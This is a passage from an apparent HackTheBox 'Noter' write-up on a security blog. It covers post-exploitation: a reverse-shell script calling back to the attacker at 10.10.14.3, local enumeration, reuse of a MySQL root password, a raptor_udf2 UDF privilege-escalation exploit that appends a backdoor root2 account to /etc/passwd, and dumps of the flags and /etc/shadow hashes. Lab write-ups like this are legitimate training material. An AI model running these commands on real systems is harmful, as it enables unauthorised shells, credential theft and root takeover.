</pre></td></tr></tbody></table></code></div></div>

<p>rev.sh:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>/bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.3/10099 0&gt;&amp;1'</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/Noter/Untitled%2011.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%2011.png" alt="Untitled" loading="lazy"></a></p>

<h2 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="local-enumeration"><span class="me-2">Local enumeration</span><a href="#local-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Enumerated local users:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>svc@noter:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh'</span>
root:x:0:0:root:/root:/bin/bash
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
svc:x:1001:1001:,,,:/home/svc:/bin/bash
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated machine:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>svc@noter:~<span class="nv">$ </span><span class="nb">cat</span> /etc/<span class="k">*</span><span class="nt">-release</span>
<span class="nv">DISTRIB_ID</span><span class="o">=</span>Ubuntu
<span class="nv">DISTRIB_RELEASE</span><span class="o">=</span>20.04
<span class="nv">DISTRIB_CODENAME</span><span class="o">=</span>focal
<span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span><span class="s2">"Ubuntu 20.04.3 LTS"</span>
<span class="nv">NAME</span><span class="o">=</span><span class="s2">"Ubuntu"</span>
<span class="nv">VERSION</span><span class="o">=</span><span class="s2">"20.04.3 LTS (Focal Fossa)"</span>
<span class="nv">ID</span><span class="o">=</span>ubuntu
<span class="nv">ID_LIKE</span><span class="o">=</span>debian
<span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">"Ubuntu 20.04.3 LTS"</span>
<span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">"20.04"</span>
<span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">"https://www.ubuntu.com/"</span>
<span class="nv">SUPPORT_URL</span><span class="o">=</span><span class="s2">"https://help.ubuntu.com/"</span>
<span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">"https://bugs.launchpad.net/ubuntu/"</span>
<span class="nv">PRIVACY_POLICY_URL</span><span class="o">=</span><span class="s2">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span>
<span class="nv">VERSION_CODENAME</span><span class="o">=</span>focal
<span class="nv">UBUNTU_CODENAME</span><span class="o">=</span>focal
svc@noter:~<span class="nv">$ </span><span class="nb">cat</span> /etc/issue
Ubuntu 20.04.3 LTS <span class="se">\n</span> <span class="se">\l</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated running services:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>svc@noter:~<span class="nv">$ </span>netstat <span class="nt">-polentau</span>
Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN      101        25450      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      0          26661      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 0.0.0.0:5000            0.0.0.0:<span class="k">*</span>               LISTEN      1001       28777      1265/python3         off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      0          27890      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 10.10.11.160:5000       10.10.14.3:32888        ESTABLISHED 1001       247993     1265/python3         off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:58582         127.0.0.1:3306          ESTABLISHED 0          255615     -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:3306          127.0.0.1:58582         ESTABLISHED 0          255616     -                    keepalive <span class="o">(</span>1103.05/0/0<span class="o">)</span>
tcp        0      1 10.10.11.160:37594      8.8.8.8:53              SYN_SENT    101        358593     -                    on <span class="o">(</span>7.80/3/0<span class="o">)</span>
tcp        0    187 10.10.11.160:57182      10.10.14.3:10099        ESTABLISHED 1001       247702     31500/bash           on <span class="o">(</span>0.24/0/0<span class="o">)</span>
tcp6       0      0 :::21                   :::<span class="k">*</span>                    LISTEN      0          26471      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      0          26663      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
udp        0      0 127.0.0.1:36551         127.0.0.53:53           ESTABLISHED 102        358592     -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
udp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>                           101        25449      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
udp        0      0 0.0.0.0:68              0.0.0.0:<span class="k">*</span>                           0          21881      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated mysql:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
</pre></td><td class="rouge-code"><pre>svc@noter:~<span class="nv">$ </span>mysql <span class="nt">-V</span>
mysql  Ver 15.1 Distrib 10.3.32-MariaDB, <span class="k">for </span>debian-linux-gnu <span class="o">(</span>x86_64<span class="o">)</span> using readline 5.2

svc@noter:~<span class="nv">$ </span>mysql
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 2483
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| information_schema |
| <span class="nb">test</span>               |
+--------------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.002 sec<span class="o">)</span>

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> use <span class="nb">test</span><span class="p">;</span>
Database changed
MariaDB <span class="o">[</span><span class="nb">test</span><span class="o">]&gt;</span> show tables
    -&gt; <span class="p">;</span>
Empty <span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>

MariaDB <span class="o">[</span><span class="nb">test</span><span class="o">]&gt;</span> <span class="nb">exit
</span>Bye

svc@noter:~<span class="nv">$ </span>mysql <span class="nt">--user</span><span class="o">=</span><span class="s2">"DB_user"</span> <span class="nt">--password</span><span class="o">=</span><span class="s2">"DB_password"</span> <span class="nt">-A</span>
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 2519
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| app                |
| information_schema |
| <span class="nb">test</span>               |
+--------------------+
3 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> use app<span class="p">;</span>
Database changed
MariaDB <span class="o">[</span>app]&gt; show tables<span class="p">;</span>
+---------------+
| Tables_in_app |
+---------------+
| notes         |
| <span class="nb">users</span>         |
+---------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>

svc@noter:~<span class="nv">$ </span>mysql <span class="nt">--user</span><span class="o">=</span><span class="s2">"root"</span> <span class="nt">--password</span><span class="o">=</span><span class="s2">"Nildogg36"</span> <span class="nt">-A</span>
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 2547
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| app                |
| information_schema |
| mysql              |
| performance_schema |
| <span class="nb">test</span>               |
+--------------------+
5 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select </span>User,Password from user<span class="p">;</span>
+---------+-------------------------------------------+
| User    | Password                                  |
+---------+-------------------------------------------+
| root    | <span class="k">*</span>937440AD99CBB4A102402708AA43B689818489C8 |
| root    |                                           |
| root    |                                           |
| root    |                                           |
|         |                                           |
|         |                                           |
| DB_user | <span class="k">*</span>52107B0F316DEF5A57F59273C66227AEA58A2671 |
+---------+-------------------------------------------+
7 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated <strong>/opt</strong></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>svc@noter:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /opt
total 12
drwxr-xr-x  2 root root 4096 May  2 23:05 <span class="nb">.</span>
drwxr-xr-x 19 root root 4096 May  2 23:05 ..
<span class="nt">-rwxr--r--</span>  1 root root  137 Dec 30 09:41 backup.sh

svc@noter:/opt<span class="nv">$ </span><span class="nb">cat </span>backup.sh
<span class="c">#!/bin/bash</span>
zip <span class="nt">-r</span> <span class="sb">`</span><span class="nb">echo</span> /home/svc/ftp/admin/app_backup_<span class="si">$(</span><span class="nb">date</span> +%s<span class="si">)</span>.zip<span class="sb">`</span> /home/svc/app/web/<span class="k">*</span> <span class="nt">-x</span> /home/svc/app/web/misc/node_modules/<span class="k">**</span><span class="se">\*</span>

svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /usr/bin/zip
<span class="nt">-rwxr-xr-x</span> 1 root root 216256 Apr 21  2017 /usr/bin/zip
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated PATH:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>svc@noter:/opt<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /home/svc/.local/bin/
drwxrwxr-x 2 svc svc 4096 May  2 23:05 /home/svc/.local/bin/
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /usr/local/sbin
drwxr-xr-x 2 root root 4096 Aug 24  2021 /usr/local/sbin
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /usr/local/bin
drwxr-xr-x 2 root root 4096 May  2 15:02 /usr/local/bin
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /sbin
lrwxrwxrwx 1 root root 8 Aug 24  2021 /sbin -&gt; usr/sbin
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /bin
lrwxrwxrwx 1 root root 7 Aug 24  2021 /bin -&gt; usr/bin
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /usr/sbin
drwxr-xr-x 2 root root 20480 May  2 19:24 /usr/sbin
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /usr/bin
drwxr-xr-x 2 root root 36864 May  2 22:49 /usr/bin
</pre></td></tr></tbody></table></code></div></div>

<h3 id="mysql-4x50-linux---user-defined-function-udf-dynamic-library-2"><span class="me-2">MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)</span><a href="#mysql-4x50-linux---user-defined-function-udf-dynamic-library-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li><a href="https://www.exploit-db.com/exploits/1518">Offensive Securityâ€™s Exploit Database Archive</a></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre>svc@noter:/dev/shm/exploit<span class="nv">$ </span>nano raptor_udf2.c
svc@noter:/dev/shm/exploit<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-c</span> raptor_udf2.c
svc@noter:/dev/shm/exploit<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-shared</span> <span class="nt">-Wl</span>,-soname,raptor_udf2.so <span class="nt">-o</span> raptor_udf2.so raptor_udf2.o <span class="nt">-lc</span>
svc@noter:/dev/shm/exploit<span class="nv">$ </span>mysql <span class="nt">--user</span><span class="o">=</span><span class="s2">"root"</span> <span class="nt">--password</span><span class="o">=</span><span class="s2">"Nildogg36"</span> <span class="nt">-A</span>
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 3445
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> use mysql<span class="p">;</span>
Database changed
MariaDB <span class="o">[</span>mysql]&gt; create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
Query OK, 0 rows affected <span class="o">(</span>0.005 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'/dev/shm/exploit/raptor_udf2.so'</span><span class="o">))</span><span class="p">;</span>
Query OK, 1 row affected <span class="o">(</span>0.002 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; show variables like <span class="s1">'%plugin%'</span><span class="p">;</span>
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select</span> <span class="k">*</span> from foo into dumpfile <span class="s1">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'</span><span class="p">;</span>
Query OK, 1 row affected <span class="o">(</span>0.001 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; create <span class="k">function </span>do_system returns integer soname <span class="s1">'raptor_udf2.so'</span><span class="p">;</span>
Query OK, 0 rows affected <span class="o">(</span>0.001 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select</span> <span class="k">*</span> from mysql.func<span class="p">;</span>
+-----------+-----+----------------+----------+
| name      | ret | dl             | <span class="nb">type</span>     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | <span class="k">function</span> |
+-----------+-----+----------------+----------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select </span>do_system<span class="o">(</span><span class="s1">'echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd'</span><span class="o">)</span><span class="p">;</span>
+---------------------------------------------------------------------------------+
| do_system<span class="o">(</span><span class="s1">'echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd'</span><span class="o">)</span> |
+---------------------------------------------------------------------------------+
|                                                                               0 |
+---------------------------------------------------------------------------------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.002 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; <span class="se">\!</span>sh
ERROR: Usage: <span class="se">\!</span> shell-command
MariaDB <span class="o">[</span>mysql]&gt; <span class="se">\!</span> sh
<span class="nv">$ </span>su root2
Password:
root@noter:/dev/shm/exploit## <span class="nb">hostname</span><span class="p">;</span> <span class="nb">id</span><span class="p">;</span> <span class="nb">cat</span> /root/root.txt<span class="p">;</span> ip a
noter
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
f6cf8b4b2c9af103636f9685571917aa
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    <span class="nb">link</span>/ether 00:50:56:b9:49:2b brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.160/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:492b/64 scope global dynamic mngtmpaddr
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:492b/64 scope <span class="nb">link
       </span>valid_lft forever preferred_lft forever
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/Noter/Untitled%2012.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%2012.png" alt="Untitled" loading="lazy"></a></p>

<h2 id="trophy"><span class="me-2">Trophy</span><a href="#trophy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><a href="/assets/img/Noter/Untitled%2013.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%2013.png" alt="Untitled" loading="lazy"></a></p>

<p><strong>User.txt</strong></p>

<p>c20d842d8d4ce26f46f247128817290d</p>

<p><strong>Root.txt</strong></p>

<p>f6cf8b4b2c9af103636f9685571917aa</p>

<p><strong>/etc/shadow</strong></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>root@noter:/dev/shm/exploit## <span class="nb">cat</span> /etc/shadow | <span class="nb">grep</span> <span class="s1">'\$'</span>
root:<span class="nv">$6$09RSjU3jIh</span>/2JW1u<span class="nv">$8jlcYzW5Oyzgh</span>/TrlTPX5Wq2HMTA6zUooij/9j0.NIttTYp4x0h6wmq8chrcdtvNpZzHlHzwsI8GesOKI3NYn.:18991:0:99999:7:::
svc:<span class="nv">$6$gTM</span>.AIsgDue4r5AQ<span class="nv">$wUBfUtg7</span>/svAcRTnsFv51KuMpeNP0cL6vqIR3608pzd0YsNNe0oxMwvY7iAGMCgMp7viiBLUwUaAZx4r6ljME/:18988:0:99999:7:::
ftp_admin:<span class="nv">$6$gQyFQc6w7p83bBwZ$6zYRlPKPBp6GMgUI5mbojxOvyup7hqrQ5hfscnLkwvIimC6qO5a0taiju1vYQPSnzf</span>.mO5TgCdo.5RiO9Gu7J0:19114:0:99999:7:::
blue:<span class="nv">$6$pNud9u</span>/1PdD8qPYi<span class="nv">$cSe5FPCRGH5xjUiEMJ5tXSclSrWSz7gimtR2IcXiiVk0xNfSACcVgU3C4z69RnZHEQKrNO</span>/hIiUQdVTqlxb29.:19114:0:99999:7:::
</pre></td></tr></tbody></table></code></div></div>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/articles-writeups/">Articles & Writeups</a>,
          <a href="/categories/hackthebox/">HackTheBox</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/hackthebox/"
            class="post-tag no-text-decoration"
          >hackthebox</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20Noter%20-%200xbro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fnoter%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20-%20Noter%20-%200xbro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fnoter%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fnoter%2F&text=HackTheBox%20-%20Noter%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

      

      <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fnoter%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

      

      <a href="https://www.reddit.com/submit?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fnoter%2F&title=HackTheBox%20-%20Noter%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit">
        <i class="fa-fw fa-brands fa-square-reddit"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/how-i-keep-updated/">How I keep updated in the infosec industry</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/">Vtenext 25.02 vulnerability research</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/wp-prevent-direct-access-CVE-2025-3861/">Incorrect Authorization to Authenticated (Contributor+) Multiple Media Actions in Prevent Direct Access Wordpress Plugin (CVE-2025-3861)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/effective-notes-with-obsidian/">Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/salesforce-hacking/">Pentesting Salesforce Communities</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
